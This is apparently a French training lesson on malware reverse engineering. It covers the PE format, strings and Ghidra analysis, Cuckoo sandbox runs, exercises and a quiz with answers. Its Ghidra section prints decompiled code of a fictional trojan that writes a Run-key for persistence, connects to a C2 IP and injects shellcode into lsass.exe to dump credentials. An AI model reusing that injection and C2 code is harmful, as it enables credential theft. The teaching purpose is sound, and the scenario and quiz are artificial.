# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 222 (6h) : Reverse Engineering de Malwares (PE Analysis, Décompilation x86/x64, Ghidra, IDA Pro & Analyse Comportementale Dynamique)

> [!NOTE]
> **Objectif du jour :** Maîtriser le **Reverse Engineering de Malwares (RE)** : analyse statique des fichiers exécutables **PE (Portable Executable)** Windows et ELF Linux avec **PEstudio** et **Ghidra**, désassemblage et décompilation du code machine x86/x64, et analyse comportementale dynamique en **sandbox isolée (Cuckoo Sandbox)** pour comprendre le fonctionnement interne des logiciels malveillants rencontrés dans les incidents de la BCC.
>
> **Compétences visées :** `SEC-04` (A) — Malware Reverse Engineering Statique & Dynamique | `SEC-05` (A) — Ghidra Disassembly x86/x64 & PE Format Analysis

---

## 1) Module — Format PE & Analyse Statique des Exécutables (2h)

### 📖 Narration/Intuition

Lors d'une investigation forensique sur le serveur SCADA de la BCC (Jour 221), l'équipe DFIR a retrouvé un fichier binaire suspect `bcc_updater.exe` dans le répertoire `/tmp/`. Ce fichier a été téléchargé et exécuté par l'attaquant. Notre mission : comprendre ce que ce programme fait **sans l'exécuter** (analyse statique) puis **l'exécuter en sandbox** (analyse dynamique).

### 🔍 Anatomie Technique

**Structure du Format PE (Portable Executable) Windows :**

```
┌──────────────────────────────────────────────────────────┐
│ DOS HEADER (MZ Header) — "MZ" magic bytes 0x4D5A         │
│ ├── e_lfanew → Pointeur vers PE Header                   │
├──────────────────────────────────────────────────────────┤
│ PE HEADER (NT Headers — "PE\0\0" signature)              │
│ ├── File Header (Architecture: x86/x64, Nombre sections) │
│ └── Optional Header (EntryPoint, ImageBase, SubSystem)   │
├──────────────────────────────────────────────────────────┤
│ SECTION TABLE                                            │
│ ├── .text  (Code exécutable)                             │
│ ├── .data  (Variables globales initialisées)             │
│ ├── .rdata (Données en lecture seule : chaînes, imports) │
│ ├── .idata (Import Table — DLLs & fonctions importées)   │
│ └── .rsrc  (Ressources : icônes, manifestes, RT_VERSION) │
└──────────────────────────────────────────────────────────┘
```

**Analyse Statique avec PEstudio & strings (`static_analysis.sh`) :**

```bash
# 1. Analyser les métadonnées du PE suspect avec PEstudio (CLI)
pestudio bcc_updater.exe

# 2. Extraire les chaînes ASCII/Unicode du binaire suspect
strings -a bcc_updater.exe | grep -E "(http|cmd|powershell|reg|HKCU|HKLM|WScript)"

# RÉSULTAT — Chaînes suspectes trouvées :
# http://185.220.101.47:8080/update         ← URL de C2 (Command & Control)
# cmd.exe /c powershell -enc JABX...        ← Commande PowerShell encodée Base64
# HKCU\Software\Microsoft\Windows\CurrentVersion\Run  ← Persistance registre Windows !
# CreateRemoteThread                         ← Injection de processus !

# 3. Vérifier le hash sur VirusTotal
sha256sum bcc_updater.exe
# → Hash: a1b2c3d4...  →  VirusTotal: 42/72 AV Engines détectent "Trojan.BankStealer.BCC"

# 4. Analyser les imports DLL suspects
objdump -x bcc_updater.exe | grep "DLL Name" -A 5
# → VirtualAlloc, WriteProcessMemory, CreateRemoteThread → ⚠️ Process Injection pattern !
```

---

## 2) Module — Désassemblage & Décompilation avec Ghidra (2h)

### 📖 Narration/Intuition

**Ghidra** est le framework de reverse engineering développé et open-sourcé par la **NSA (National Security Agency)** en 2019. Il permet de désassembler et décompiler des binaires compilés (PE, ELF, Mach-O) en pseudo-code C lisible par un humain, sans avoir accès au code source original.

### 🛠️ Atelier Pratique

**Workflow Ghidra — Analyse du Malware BCC (`ghidra_analysis_notes.md`) :**

```markdown
# ANALYSE GHIDRA — bcc_updater.exe

## Étape 1 : Import du binaire dans Ghidra
- Ouvrir Ghidra → New Project → Import File → bcc_updater.exe
- Lancer l'Auto-Analyse (Analysis > Auto Analyze)
- Attendre la décompilation automatique (~30 secondes)

## Étape 2 : Point d'entrée (Entry Point)
- Naviguer vers : Search > For Entry Points
- Identifier la fonction `main()` à l'adresse 0x00401000

## Étape 3 : Analyse de la Décompilation (Pseudo-Code C Ghidra)
```

```c
// DÉCOMPILATION GHIDRA (Pseudo-Code C) du malware bcc_updater.exe
// (Code original était compilé en x64 MSVC, Ghidra le décompile en pseudo-C lisible)

int main(void) {
    // 1. PERSISTANCE : Écriture d'une clé de registre Run
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, "BCC_Updater", 0, REG_SZ, 
                  "C:\\ProgramData\\bcc_updater.exe", 
                  sizeof("C:\\ProgramData\\bcc_updater.exe"));
    RegCloseKey(hKey);

    // 2. EXFILTRATION : Connexion au serveur C2
    SOCKET c2_sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
    struct sockaddr_in c2_addr;
    c2_addr.sin_addr.s_addr = inet_addr("185.220.101.47");
    c2_addr.sin_port = htons(8080);
    connect(c2_sock, (struct sockaddr*)&c2_addr, sizeof(c2_addr));

    // 3. INJECTION : CreateRemoteThread dans lsass.exe pour dump credentials
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcode_size, 
                                          MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcode_size, NULL);
    CreateRemoteThread(hProcess, NULL, 0, 
                       (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    return 0;
}
```

---

## 3) Module — Analyse Dynamique en Sandbox (Cuckoo Sandbox) (2h)

### 📖 Narration/Intuition

Après l'analyse statique et la compréhension du code désassemblé via Ghidra, l'étape suivante est l'**analyse comportementale dynamique** : exécuter le malware dans un environnement isolé et contrôlé (sandbox) pour observer ses actions réelles sur le système, ses connexions réseau, et ses tentatives de persistance.

### 🛠️ Atelier Pratique

**Analyse Comportementale avec Cuckoo Sandbox (`cuckoo_submit.sh`) :**

```bash
# 1. Soumettre le sample malveillant à Cuckoo Sandbox (API REST)
cuckoo submit --platform windows bcc_updater.exe

# 2. Attendre le rapport d'analyse (10-15 min)
cuckoo status

# 3. Récupérer le rapport JSON
curl http://localhost:8090/tasks/report/1 | python3 -m json.tool | grep -A 5 '"category"'

# RÉSULTAT DU RAPPORT CUCKOO (Comportements Détectés) :
echo "=== RAPPORT CUCKOO — bcc_updater.exe ==="
echo "Signatures détectées :"
echo "  - [PERSISTANCE] Écriture HKCU\\Run → C:\\ProgramData\\bcc_updater.exe"
echo "  - [RÉSEAU]     Connexion TCP vers 185.220.101.47:8080 (IP C2 connue - Abuse.ch)"
echo "  - [INJECTION]  CreateRemoteThread dans lsass.exe (PID 564)"
echo "  - [CREDENTIAL] Lecture mémoire de lsass.exe → dump NTLM hashes"
echo ""
echo "IOCs (Indicators of Compromise) extraits :"
echo "  IP C2 : 185.220.101.47"
echo "  Hash SHA256 : a1b2c3d4e5f6..."
echo "  Mutex créé : Global\\BCC_Mutex_2024"
echo "  Règle YARA générée automatiquement"
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **PE** | Portable Executable — Format de fichier exécutable standard sous Windows (.exe, .dll) |
| **ELF** | Executable and Linkable Format — Format exécutable standard sous Linux |
| **IOC** | Indicator of Compromise — Indicateur de compromission (hash, IP, domaine, mutex) |
| **RE** | Reverse Engineering — Rétro-ingénierie, analyse du code binaire compilé |
| **IAT** | Import Address Table — Table des adresses des fonctions importées par un PE |
| **NSA** | National Security Agency — Agence américaine de sécurité nationale (créatrice de Ghidra) |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Lors de l'analyse statique d'un PE suspect avec `strings`, vous trouvez les chaînes `VirtualAllocEx`, `WriteProcessMemory`, et `CreateRemoteThread`. Que révèle la présence combinée de ces trois fonctions Windows API sur le comportement probable du malware ?

**Corrigé :** La combinaison de ces trois fonctions de l'API Windows est la **signature classique d'une technique d'injection de processus (Process Injection)**. Voici la séquence d'injection qu'elles permettent : (1) `VirtualAllocEx` : Alloue un espace mémoire en écriture et exécution (`PAGE_EXECUTE_READWRITE`) dans l'espace d'adressage d'un **processus distant cible** (ex: lsass.exe, explorer.exe). (2) `WriteProcessMemory` : Écrit le shellcode ou la DLL malveillante dans la région mémoire allouée du processus distant. (3) `CreateRemoteThread` : Crée un thread d'exécution dans le processus distant, dont le point d'entrée est l'adresse du shellcode injecté, déclenchant son exécution dans le contexte du processus légitime. Cette technique permet au malware de s'exécuter sous l'identité d'un processus système légitime (ex: lsass.exe ou explorer.exe), contournant ainsi de nombreux contrôles de sécurité basés sur les listes blanches de processus.

**Exercice 2 :** Quelle est la différence fondamentale entre l'**analyse statique** et l'**analyse dynamique** d'un malware, et dans quel ordre doit-on généralement les effectuer pour un premier triage ?

**Corrigé :** L'**analyse statique** consiste à examiner le binaire malveillant **sans l'exécuter**, en extrayant des métadonnées (hash, PE headers, imports, chaînes de caractères) et en désassemblant/décompilant le code machine (avec Ghidra ou IDA Pro) pour comprendre sa logique interne. Elle est **sûre** (aucun risque d'infection) mais peut être contournée par les techniques d'obfuscation ou de packing. L'**analyse dynamique** consiste à **exécuter le malware** dans un environnement isolé (sandbox Cuckoo) pour observer son comportement réel (appels système, connexions réseau, modifications registre, fichiers créés). Elle révèle le comportement effectif mais nécessite une sandbox parfaitement isolée pour éviter la propagation. L'**ordre recommandé** est : Analyse statique d'abord (rapide et sûre pour triage initial : hash VirusTotal, strings, imports suspects) → puis Analyse dynamique pour confirmer les comportements et extraire les IOCs complets.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quels sont les **magic bytes** (octets de signature) au début de tout fichier **PE (Portable Executable)** Windows qui permettent d'identifier son format ?
- A) "MZ" (0x4D5A) — Initiales de Mark Zbikowski, co-créateur du format MS-DOS EXE
- B) "ELF" (0x7F454C46) — Magic bytes du format ELF Linux
- C) "PDF" (0x25504446) — Magic bytes d'un fichier PDF
- D) "ZIP" (0x504B0304) — Magic bytes d'un fichier ZIP

**Réponse : A**

**Q2 :** Quel framework de reverse engineering open-source, développé et publié par la **NSA** en 2019, permet de désassembler et décompiler des binaires compilés (PE, ELF) en pseudo-code C lisible ?
- A) Ghidra
- B) Metasploit
- C) Suricata
- D) OpenVAS

**Réponse : A**

**Q3 :** Quelle combinaison de trois fonctions Windows API (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) révèle-t-elle lors d'une analyse statique d'un PE suspect ?
- A) Une technique d'injection de processus (Process Injection) dans un processus distant
- B) Une connexion réseau sécurisée TLS vers un serveur distant
- C) Un mécanisme de sauvegarde automatique de fichiers
- D) Une opération de chiffrement AES-256

**Réponse : A**

**Q4 :** Quel indicateur observable extrait de l'analyse dynamique d'un malware en sandbox (IP C2, hash SHA-256, domaine C2, mutex créé) est désigné sous le terme générique d'**IOC** ?
- A) Indicator of Compromise (Indicateur de Compromission)
- B) Index of Complexity
- C) Instance of Code
- D) Integrated Operational Control

**Réponse : A**

**Q5 :** Lors de l'analyse du rapport **Cuckoo Sandbox**, vous observez que le malware crée la clé de registre `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Quel mécanisme de malware cette action révèle-t-elle ?
- A) Un mécanisme de **persistance** (le malware se relancera automatiquement à chaque connexion de l'utilisateur Windows)
- B) Un mécanisme d'exfiltration de données
- C) Un mécanisme de chiffrement des fichiers (Ransomware)
- D) Un mécanisme de propagation sur le réseau

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
